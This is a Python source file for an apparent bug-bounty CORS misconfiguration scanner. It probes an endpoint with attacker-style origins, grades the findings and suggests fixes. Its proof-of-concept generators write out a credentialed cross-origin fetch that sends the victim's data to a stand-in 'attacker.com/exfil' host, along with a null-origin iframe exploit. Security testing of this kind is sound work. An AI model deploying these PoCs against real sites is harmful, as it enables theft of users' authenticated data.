"""
CORS Security Tester Agent

Advanced CORS (Cross-Origin Resource Sharing) security testing agent that identifies
misconfigurations and potential security vulnerabilities in CORS implementations.

This agent tests for:
- Wildcard ACAO with credentials
- Origin reflection vulnerabilities
- Null origin bypass
- Subdomain trust exploitation
- Pre-flight bypass attempts
- Credential exposure testing
- Protocol-based attacks (HTTP/HTTPS)
- Regex bypass techniques
- Trust boundary violations

Author: BountyHound Team
Version: 1.0.0
"""

from engine.core.tool_bridge import sync_nuclei_scan, sync_nmap_scan, sync_ffuf_fuzz, sync_sqlmap_test, sync_amass_enum, sync_gobuster_enum, sync_bloodhound_enum, sync_metasploit_execute, sync_nessus_scan, sync_volatility_analyze, sync_zeek_analyze
import re
import json
import urllib.parse
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, field, asdict
from datetime import date
from enum import Enum


try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False


class CORSSeverity(Enum):
    """CORS vulnerability severity levels."""
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"


class CORSVulnType(Enum):
    """Types of CORS vulnerabilities."""
    WILDCARD_WITH_CREDENTIALS = "CORS_WILDCARD_CREDENTIALS"
    ORIGIN_REFLECTION = "CORS_ORIGIN_REFLECTION"
    NULL_ORIGIN_BYPASS = "CORS_NULL_ORIGIN"
    SUBDOMAIN_TRUST = "CORS_SUBDOMAIN_TRUST"
    PREFLIGHT_BYPASS = "CORS_PREFLIGHT_BYPASS"
    CREDENTIAL_EXPOSURE = "CORS_CREDENTIAL_EXPOSURE"
    PROTOCOL_DOWNGRADE = "CORS_PROTOCOL_DOWNGRADE"
    REGEX_BYPASS = "CORS_REGEX_BYPASS"
    TRUST_BOUNDARY = "CORS_TRUST_BOUNDARY"


@dataclass
class CORSFinding:
    """Represents a CORS security finding."""
    title: str
    severity: CORSSeverity
    vuln_type: CORSVulnType
    description: str
    endpoint: str
    origin_tested: str
    response_headers: Dict[str, str] = field(default_factory=dict)
    request_headers: Dict[str, str] = field(default_factory=dict)
    poc: str = ""
    impact: str = ""
    recommendation: str = ""
    cwe_id: Optional[str] = None
    discovered_date: str = field(default_factory=lambda: date.today().isoformat())

    def to_dict(self) -> Dict[str, Any]:
        """Convert finding to dictionary with enum handling."""
        data = asdict(self)
        data['severity'] = self.severity.value
        data['vuln_type'] = self.vuln_type.value
        return data


@dataclass
class CORSTestResult:
    """Result from a CORS test."""
    endpoint: str
    origin: str
    has_cors: bool
    acao_header: Optional[str] = None
    acac_header: Optional[str] = None
    acah_header: Optional[str] = None
    acam_header: Optional[str] = None
    vary_header: Optional[str] = None
    is_vulnerable: bool = False
    vulnerability_type: Optional[CORSVulnType] = None
    details: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        """Convert test result to dictionary."""
        data = asdict(self)
        if self.vulnerability_type:
            data['vulnerability_type'] = self.vulnerability_type.value
        return data


class CORSTester:
    """
    Advanced CORS Security Tester.

    Performs comprehensive CORS misconfiguration testing including:
    - Wildcard and origin reflection detection
    - Null origin bypass testing
    - Subdomain trust exploitation
    - Pre-flight bypass attempts
    - Credential exposure testing

    Usage:
        tester = CORSTester(target_url="https://api.example.com")
        findings = tester.run_all_tests()
    """

    # Common attack origins for testing
    ATTACK_ORIGINS = [
        "https://evil.com",
        "https://attacker.com",
        "http://malicious.org",
        "https://hacker.net"
    ]

    # Null origin variants
    NULL_ORIGINS = [
        "null",
        "Null",
        "NULL",
        "null null",
        "file://",
        "data:text/html,<script>alert(1)</script>"
    ]

    # Protocol variants
    PROTOCOL_VARIANTS = [
        "http://{domain}",
        "https://{domain}",
        "ftp://{domain}",
        "file://{domain}"
    ]

    def __init__(self, target_url: str, timeout: int = 10,
                 custom_origins: Optional[List[str]] = None,
                 verify_ssl: bool = True):
        """
        Initialize the CORS Tester.

        Args:
            target_url: Target API endpoint URL
            timeout: Request timeout in seconds
            custom_origins: Additional custom origins to test
            verify_ssl: Whether to verify SSL certificates
        """
        if not REQUESTS_AVAILABLE:
            raise ImportError("requests library is required. Install with: pip install requests")

        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.findings: List[CORSFinding] = []
        self.test_results: List[CORSTestResult] = []

        # Extract domain from target URL
        self.domain = self._extract_domain(target_url)

        # Build comprehensive origin list
        self.test_origins = self._build_origin_list(custom_origins or [])

    def _extract_domain(self, url: str) -> str:
        """Extract domain from URL."""
        parsed = urllib.parse.urlparse(url)
        return parsed.netloc or parsed.path.split('/')[0]

    def _build_origin_list(self, custom_origins: List[str]) -> List[str]:
        """Build comprehensive list of origins to test."""
        origins = []

        # Add attack origins
        origins.extend(self.ATTACK_ORIGINS)

        # Add null origins
        origins.extend(self.NULL_ORIGINS)

        # Add subdomain variants if domain contains subdomain
        if self.domain and '.' in self.domain:
            parts = self.domain.split('.')

            # Try subdomains
            if len(parts) >= 3:
                # api.example.com -> evil.example.com
                base_domain = '.'.join(parts[-2:])
                origins.extend([
                    f"https://evil.{base_domain}",
                    f"https://attacker.{base_domain}",
                    f"http://malicious.{base_domain}"
                ])

            # Try domain prefix/suffix
            origins.extend([
                f"https://{self.domain}.evil.com",
                f"https://evil{self.domain}",
                f"https://{self.domain}evil.com",
                f"https://evil-{self.domain}"
            ])

        # Add protocol variants for the target domain
        if self.domain:
            for variant in self.PROTOCOL_VARIANTS:
                origins.append(variant.format(domain=self.domain))

        # Add custom origins
        origins.extend(custom_origins)

        # Remove duplicates while preserving order
        seen = set()
        unique_origins = []
        for origin in origins:
            if origin not in seen:
                seen.add(origin)
                unique_origins.append(origin)

        return unique_origins

    def _make_cors_request(self, origin: str, method: str = "GET",
                          with_credentials: bool = False,
                          custom_headers: Optional[Dict[str, str]] = None) -> Optional[CORSTestResult]:
        """
        Make a CORS request with specified origin.

        Args:
            origin: Origin header value
            method: HTTP method
            with_credentials: Whether to simulate credential request
            custom_headers: Additional headers to include

        Returns:
            CORSTestResult or None if request failed
        """
        headers = {"Origin": origin}

        if custom_headers:
            headers.update(custom_headers)

        try:
            # For preflight, use OPTIONS method
            if method == "OPTIONS":
                headers["Access-Control-Request-Method"] = "POST"
                headers["Access-Control-Request-Headers"] = "Content-Type,X-Custom-Header"

            response = requests.request(
                method=method,
                url=self.target_url,
                headers=headers,
                timeout=self.timeout,
                verify=self.verify_ssl,
                allow_redirects=False
            )

            # Extract CORS headers
            acao = response.headers.get('Access-Control-Allow-Origin')
            acac = response.headers.get('Access-Control-Allow-Credentials')
            acah = response.headers.get('Access-Control-Allow-Headers')
            acam = response.headers.get('Access-Control-Allow-Methods')
            vary = response.headers.get('Vary')

            result = CORSTestResult(
                endpoint=self.target_url,
                origin=origin,
                has_cors=acao is not None,
                acao_header=acao,
                acac_header=acac,
                acah_header=acah,
                acam_header=acam,
                vary_header=vary,
                details={
                    'status_code': response.status_code,
                    'all_headers': dict(response.headers)
                }
            )

            self.test_results.append(result)
            return result

        except requests.exceptions.RequestException as e:
            # Log error but don't fail entire test suite
            return None

    def test_wildcard_with_credentials(self) -> List[CORSFinding]:
        """
        Test for wildcard ACAO (*) with credentials enabled.

        This is blocked by browsers per spec, but still worth noting.
        """
        findings = []

        for origin in self.ATTACK_ORIGINS[:2]:  # Test a few
            result = self._make_cors_request(origin)

            if result and result.has_cors:
                if result.acao_header == "*" and result.acac_header == "true":
                    finding = CORSFinding(
                        title="CORS Wildcard with Credentials (Browser-Blocked)",
                        severity=CORSSeverity.INFO,
                        vuln_type=CORSVulnType.WILDCARD_WITH_CREDENTIALS,
                        description=(
                            f"The endpoint returns Access-Control-Allow-Origin: * with "
                            f"Access-Control-Allow-Credentials: true. While this is blocked "
                            f"by browsers per specification, it indicates a misconfiguration "
                            f"and potential security gap in server-side CORS logic."
                        ),
                        endpoint=self.target_url,
                        origin_tested=origin,
                        response_headers=result.details.get('all_headers', {}),
                        request_headers={"Origin": origin},
                        poc=self._generate_curl_poc(origin),
                        impact=(
                            "While browsers block this combination, the misconfiguration "
                            "suggests weak CORS validation that could be exploitable in "
                            "non-browser contexts or with future browser changes."
                        ),
                        recommendation=(
                            "Never use Access-Control-Allow-Origin: * with credentials. "
                            "Use explicit origin whitelisting instead."
                        ),
                        cwe_id="CWE-942"
                    )
                    findings.append(finding)
                    result.is_vulnerable = True
                    result.vulnerability_type = CORSVulnType.WILDCARD_WITH_CREDENTIALS
                    break

        return findings

    def test_origin_reflection(self) -> List[CORSFinding]:
        """
        Test if server reflects arbitrary origins in ACAO header.

        This is the most common and critical CORS vulnerability.
        """
        findings = []

        for origin in self.ATTACK_ORIGINS:
            result = self._make_cors_request(origin)

            if result and result.has_cors:
                # Check if origin is reflected
                if result.acao_header == origin:
                    # Check if credentials are allowed
                    severity = CORSSeverity.CRITICAL if result.acac_header == "true" else CORSSeverity.HIGH

                    finding = CORSFinding(
                        title=f"CORS Origin Reflection {'with Credentials' if result.acac_header == 'true' else ''}",
                        severity=severity,
                        vuln_type=CORSVulnType.ORIGIN_REFLECTION,
                        description=(
                            f"The endpoint reflects arbitrary origins in the Access-Control-Allow-Origin "
                            f"header. Testing with origin '{origin}' was successful. "
                            f"{'Credentials are allowed, enabling full account takeover attacks.' if result.acac_header == 'true' else 'Credentials are not allowed, but sensitive data may still be exposed.'}"
                        ),
                        endpoint=self.target_url,
                        origin_tested=origin,
                        response_headers=result.details.get('all_headers', {}),
                        request_headers={"Origin": origin},
                        poc=self._generate_exploit_poc(origin, result.acac_header == "true"),
                        impact=(
                            "An attacker can host a malicious website that makes authenticated "
                            "requests to this endpoint and reads the response, potentially "
                            "stealing sensitive data or performing actions on behalf of victims."
                            if result.acac_header == "true"
                            else
                            "An attacker can read response data from this endpoint via a "
                            "malicious website, potentially exposing sensitive information."
                        ),
                        recommendation=(
                            "Implement a strict origin whitelist. Only allow trusted domains. "
                            "Validate the Origin header against a whitelist before reflecting it."
                        ),
                        cwe_id="CWE-942"
                    )
                    findings.append(finding)
                    result.is_vulnerable = True
                    result.vulnerability_type = CORSVulnType.ORIGIN_REFLECTION
                    break  # Found vulnerability, no need to test more

        return findings

    def test_null_origin_bypass(self) -> List[CORSFinding]:
        """
        Test if 'null' origin is allowed.

        The null origin can be triggered from sandboxed iframes or local files.
        """
        findings = []

        for null_variant in self.NULL_ORIGINS:
            result = self._make_cors_request(null_variant)

            if result and result.has_cors:
                # Check if null origin is accepted
                if result.acao_header in ["null", null_variant]:
                    severity = CORSSeverity.HIGH if result.acac_header == "true" else CORSSeverity.MEDIUM

                    finding = CORSFinding(
                        title=f"CORS Null Origin Bypass {'with Credentials' if result.acac_header == 'true' else ''}",
                        severity=severity,
                        vuln_type=CORSVulnType.NULL_ORIGIN_BYPASS,
                        description=(
                            f"The endpoint allows the 'null' origin (variant: '{null_variant}'). "
                            f"This can be exploited using sandboxed iframes or local HTML files. "
                            f"{'Credentials are allowed.' if result.acac_header == 'true' else ''}"
                        ),
                        endpoint=self.target_url,
                        origin_tested=null_variant,
                        response_headers=result.details.get('all_headers', {}),
                        request_headers={"Origin": null_variant},
                        poc=self._generate_null_origin_poc(result.acac_header == "true"),
                        impact=(
                            "An attacker can create a sandboxed iframe or local HTML file that "
                            "makes requests with the null origin, bypassing CORS protections."
                        ),
                        recommendation=(
                            "Never allow the 'null' origin. Reject requests with Origin: null "
                            "or validate against a strict whitelist of HTTPS origins only."
                        ),
                        cwe_id="CWE-942"
                    )
                    findings.append(finding)
                    result.is_vulnerable = True
                    result.vulnerability_type = CORSVulnType.NULL_ORIGIN_BYPASS
                    break

        return findings

    def test_subdomain_trust(self) -> List[CORSFinding]:
        """
        Test if server trusts all subdomains.

        If an attacker can compromise any subdomain (via XSS, subdomain takeover, etc.),
        they can bypass CORS protections.
        """
        findings = []

        if not self.domain or '.' not in self.domain:
            return findings

        # Extract base domain
        parts = self.domain.split('.')
        if len(parts) < 2:
            return findings

        base_domain = '.'.join(parts[-2:])

        # Test evil subdomains
        test_subdomains = [
            f"https://evil.{base_domain}",
            f"https://attacker.{base_domain}",
            f"https://malicious.{base_domain}"
        ]

        for subdomain in test_subdomains:
            result = self._make_cors_request(subdomain)

            if result and result.has_cors:
                if result.acao_header == subdomain:
                    severity = CORSSeverity.HIGH if result.acac_header == "true" else CORSSeverity.MEDIUM

                    finding = CORSFinding(
                        title=f"CORS Subdomain Trust Exploitation {'with Credentials' if result.acac_header == 'true' else ''}",
                        severity=severity,
                        vuln_type=CORSVulnType.SUBDOMAIN_TRUST,
                        description=(
                            f"The endpoint trusts all subdomains of '{base_domain}'. "
                            f"Testing with '{subdomain}' was successful. If an attacker can "
                            f"compromise any subdomain (via XSS, subdomain takeover, etc.), "
                            f"they can bypass CORS protections."
                        ),
                        endpoint=self.target_url,
                        origin_tested=subdomain,
                        response_headers=result.details.get('all_headers', {}),
                        request_headers={"Origin": subdomain},
                        poc=self._generate_exploit_poc(subdomain, result.acac_header == "true"),
                        impact=(
                            "If an attacker compromises any subdomain through XSS, subdomain "
                            "takeover, or other means, they can make authenticated requests to "
                            "this endpoint and access sensitive data."
                        ),
                        recommendation=(
                            "Do not trust all subdomains. Maintain an explicit whitelist of "
                            "trusted origins. Implement subdomain takeover prevention and "
                            "regular subdomain enumeration monitoring."
                        ),
                        cwe_id="CWE-942"
                    )
                    findings.append(finding)
                    result.is_vulnerable = True
                    result.vulnerability_type = CORSVulnType.SUBDOMAIN_TRUST
                    break

        return findings

    def test_preflight_bypass(self) -> List[CORSFinding]:
        """
        Test if preflight OPTIONS requests are improperly handled.

        Some servers may allow dangerous methods/headers without proper validation.
        """
        findings = []

        # Test preflight with evil origin
        for origin in self.ATTACK_ORIGINS[:2]:
            result = self._make_cors_request(origin, method="OPTIONS")

            if result and result.has_cors:
                # Check if dangerous methods/headers are allowed
                allowed_methods = (result.acam_header or "").upper()
                allowed_headers = (result.acah_header or "").lower()

                has_issue = False
                issues = []

                # Check for reflected origin in preflight
                if result.acao_header == origin:
                    has_issue = True
                    issues.append("Origin reflection in preflight")

                # Check for overly permissive methods
                dangerous_methods = ["PUT", "DELETE", "PATCH"]
                for method in dangerous_methods:
                    if method in allowed_methods:
                        has_issue = True
                        issues.append(f"Allows {method} method")

                # Check for wildcard headers
                if "*" in allowed_headers:
                    has_issue = True
                    issues.append("Allows wildcard headers (*)")

                if has_issue:
                    finding = CORSFinding(
                        title="CORS Preflight Misconfiguration",
                        severity=CORSSeverity.MEDIUM,
                        vuln_type=CORSVulnType.PREFLIGHT_BYPASS,
                        description=(
                            f"The preflight OPTIONS request reveals CORS misconfigurations: "
                            f"{', '.join(issues)}. This may allow attackers to perform "
                            f"dangerous cross-origin requests."
                        ),
                        endpoint=self.target_url,
                        origin_tested=origin,
                        response_headers=result.details.get('all_headers', {}),
                        request_headers={"Origin": origin},
                        poc=self._generate_preflight_poc(origin),
                        impact=(
                            "Attackers may be able to bypass CORS protections and perform "
                            "state-changing operations or access sensitive endpoints."
                        ),
                        recommendation=(
                            "Restrict allowed methods to only what's necessary (typically GET, POST). "
                            "Validate allowed headers explicitly. Never reflect arbitrary origins "
                            "in preflight responses."
                        ),
                        cwe_id="CWE-942"
                    )
                    findings.append(finding)
                    result.is_vulnerable = True
                    result.vulnerability_type = CORSVulnType.PREFLIGHT_BYPASS
                    break

        return findings

    def test_protocol_downgrade(self) -> List[CORSFinding]:
        """
        Test if HTTP origin is accepted when target is HTTPS.

        This allows protocol downgrade attacks.
        """
        findings = []

        if not self.target_url.startswith('https://'):
            return findings  # Only relevant for HTTPS endpoints

        # Test HTTP variant of domain
        http_origin = f"http://{self.domain}"
        result = self._make_cors_request(http_origin)

        if result and result.has_cors:
            if result.acao_header == http_origin:
                finding = CORSFinding(
                    title="CORS Protocol Downgrade Vulnerability",
                    severity=CORSSeverity.MEDIUM,
                    vuln_type=CORSVulnType.PROTOCOL_DOWNGRADE,
                    description=(
                        f"The HTTPS endpoint accepts HTTP origins. This allows protocol "
                        f"downgrade attacks where an attacker on the network can intercept "
                        f"and modify HTTP traffic to bypass CORS protections."
                    ),
                    endpoint=self.target_url,
                    origin_tested=http_origin,
                    response_headers=result.details.get('all_headers', {}),
                    request_headers={"Origin": http_origin},
                    poc=self._generate_curl_poc(http_origin),
                    impact=(
                        "An active network attacker (MITM) can intercept HTTP traffic and "
                        "make cross-origin requests to this HTTPS endpoint."
                    ),
                    recommendation=(
                        "Only accept HTTPS origins for HTTPS endpoints. Reject HTTP origins "
                        "in the CORS validation logic."
                    ),
                    cwe_id="CWE-319"
                )
                findings.append(finding)
                result.is_vulnerable = True
                result.vulnerability_type = CORSVulnType.PROTOCOL_DOWNGRADE

        return findings

    def test_regex_bypass(self) -> List[CORSFinding]:
        """
        Test for common regex bypass techniques in origin validation.

        Checks for prefix/suffix bypass, domain injection, etc.
        """
        findings = []

        if not self.domain:
            return findings

        # Regex bypass techniques
        bypass_origins = [
            f"https://{self.domain}.evil.com",  # Suffix bypass
            f"https://evil.{self.domain}",      # Prefix bypass (if not subdomain)
            f"https://{self.domain}evil.com",   # No delimiter
            f"https://evil-{self.domain}",      # Hyphen injection
            f"https://evil{self.domain}",       # Direct concatenation
        ]

        for bypass_origin in bypass_origins:
            result = self._make_cors_request(bypass_origin)

            if result and result.has_cors:
                if result.acao_header == bypass_origin:
                    finding = CORSFinding(
                        title="CORS Regex Bypass Vulnerability",
                        severity=CORSSeverity.HIGH,
                        vuln_type=CORSVulnType.REGEX_BYPASS,
                        description=(
                            f"The origin validation can be bypassed using regex exploitation. "
                            f"The malicious origin '{bypass_origin}' was accepted, likely due to "
                            f"improper regex validation (e.g., missing anchors or boundary checks)."
                        ),
                        endpoint=self.target_url,
                        origin_tested=bypass_origin,
                        response_headers=result.details.get('all_headers', {}),
                        request_headers={"Origin": bypass_origin},
                        poc=self._generate_exploit_poc(bypass_origin, result.acac_header == "true"),
                        impact=(
                            "Attackers can register domains that bypass the origin validation "
                            "regex and perform cross-origin attacks."
                        ),
                        recommendation=(
                            "Use exact string matching instead of regex, or ensure regex uses "
                            "proper anchors (^ and $) and escapes dots. Example: ^https://example\\.com$"
                        ),
                        cwe_id="CWE-942"
                    )
                    findings.append(finding)
                    result.is_vulnerable = True
                    result.vulnerability_type = CORSVulnType.REGEX_BYPASS
                    break

        return findings

    def test_credential_exposure(self) -> List[CORSFinding]:
        """
        Test if credentials are exposed when they shouldn't be.

        Checks if Access-Control-Allow-Credentials is set unnecessarily.
        """
        findings = []

        # Test with same-origin
        if self.domain:
            same_origin = f"https://{self.domain}"
            result = self._make_cors_request(same_origin)

            if result and result.has_cors:
                # Check if credentials are allowed when not needed
                if result.acac_header == "true":
                    # This is informational - credentials may be legitimate
                    finding = CORSFinding(
                        title="CORS Credentials Enabled",
                        severity=CORSSeverity.INFO,
                        vuln_type=CORSVulnType.CREDENTIAL_EXPOSURE,
                        description=(
                            f"The endpoint allows credentials (cookies, authorization headers) "
                            f"in cross-origin requests. While this may be intentional, it "
                            f"increases attack surface if combined with other CORS misconfigurations."
                        ),
                        endpoint=self.target_url,
                        origin_tested=same_origin,
                        response_headers=result.details.get('all_headers', {}),
                        request_headers={"Origin": same_origin},
                        poc=self._generate_curl_poc(same_origin),
                        impact=(
                            "If combined with origin reflection or other CORS vulnerabilities, "
                            "this allows full account takeover attacks."
                        ),
                        recommendation=(
                            "Only enable Access-Control-Allow-Credentials if absolutely necessary. "
                            "If enabled, ensure strict origin validation is in place."
                        ),
                        cwe_id="CWE-942"
                    )
                    findings.append(finding)

        return findings

    def run_all_tests(self) -> List[CORSFinding]:
        """
        Run all CORS security tests.

        Returns:
            List of all findings discovered
        """
        all_findings = []

        # Run each test category
        test_methods = [
            self.test_origin_reflection,
            self.test_null_origin_bypass,
            self.test_subdomain_trust,
            self.test_preflight_bypass,
            self.test_wildcard_with_credentials,
            self.test_protocol_downgrade,
            self.test_regex_bypass,
            self.test_credential_exposure
        ]

        for test_method in test_methods:
            findings = test_method()
            all_findings.extend(findings)
            self.findings.extend(findings)

        return all_findings

    def get_findings_by_severity(self, severity: CORSSeverity) -> List[CORSFinding]:
        """Get findings filtered by severity level."""
        return [f for f in self.findings if f.severity == severity]

    def get_critical_findings(self) -> List[CORSFinding]:
        """Get all critical severity findings."""
        return self.get_findings_by_severity(CORSSeverity.CRITICAL)

    def get_summary(self) -> Dict[str, Any]:
        """
        Generate summary of test results.

        Returns:
            Dictionary with test statistics and findings
        """
        severity_counts = {
            'CRITICAL': len(self.get_findings_by_severity(CORSSeverity.CRITICAL)),
            'HIGH': len(self.get_findings_by_severity(CORSSeverity.HIGH)),
            'MEDIUM': len(self.get_findings_by_severity(CORSSeverity.MEDIUM)),
            'LOW': len(self.get_findings_by_severity(CORSSeverity.LOW)),
            'INFO': len(self.get_findings_by_severity(CORSSeverity.INFO))
        }

        return {
            'target': self.target_url,
            'total_tests': len(self.test_results),
            'total_findings': len(self.findings),
            'severity_breakdown': severity_counts,
            'vulnerable': len(self.findings) > 0,
            'findings': [f.to_dict() for f in self.findings]
        }

    # POC Generation Methods

    def _generate_curl_poc(self, origin: str) -> str:
        """Generate curl command POC."""
        return f"""curl -X GET '{self.target_url}' \\
  -H 'Origin: {origin}' \\
  -v"""

    def _generate_exploit_poc(self, origin: str, with_credentials: bool) -> str:
        """Generate JavaScript exploit POC."""
        credentials = "credentials: 'include'," if with_credentials else ""

        return f"""<!-- Host this HTML on {origin} -->
<html>
<body>
<script>
fetch('{self.target_url}', {{
  method: 'GET',
  {credentials}
  headers: {{'Content-Type': 'application/json'}}
}})
.then(r => r.json())
.then(data => {{
  console.log('Stolen data:', data);
  // Exfiltrate to attacker server
  fetch('https://attacker.com/exfil', {{
    method: 'POST',
    body: JSON.stringify(data)
  }});
}});
</script>
</body>
</html>"""

    def _generate_null_origin_poc(self, with_credentials: bool) -> str:
        """Generate null origin exploit POC."""
        credentials = "credentials: 'include'," if with_credentials else ""

        return f"""<!-- Save as local HTML file or use sandboxed iframe -->
<iframe sandbox="allow-scripts allow-forms" srcdoc="
<script>
fetch('{self.target_url}', {{
  method: 'GET',
  {credentials}
  headers: {{'Content-Type': 'application/json'}}
}})
.then(r => r.json())
.then(data => console.log('Data via null origin:', data));
</script>
"></iframe>"""

    def _generate_preflight_poc(self, origin: str) -> str:
        """Generate preflight request POC."""
        return f"""# Preflight OPTIONS request
curl -X OPTIONS '{self.target_url}' \\
  -H 'Origin: {origin}' \\
  -H 'Access-Control-Request-Method: POST' \\
  -H 'Access-Control-Request-Headers: Content-Type,X-Custom-Header' \\
  -v

# Actual request
curl -X POST '{self.target_url}' \\
  -H 'Origin: {origin}' \\
  -H 'Content-Type: application/json' \\
  -H 'X-Custom-Header: value' \\
  -d '{{"key": "value"}}' \\
  -v"""
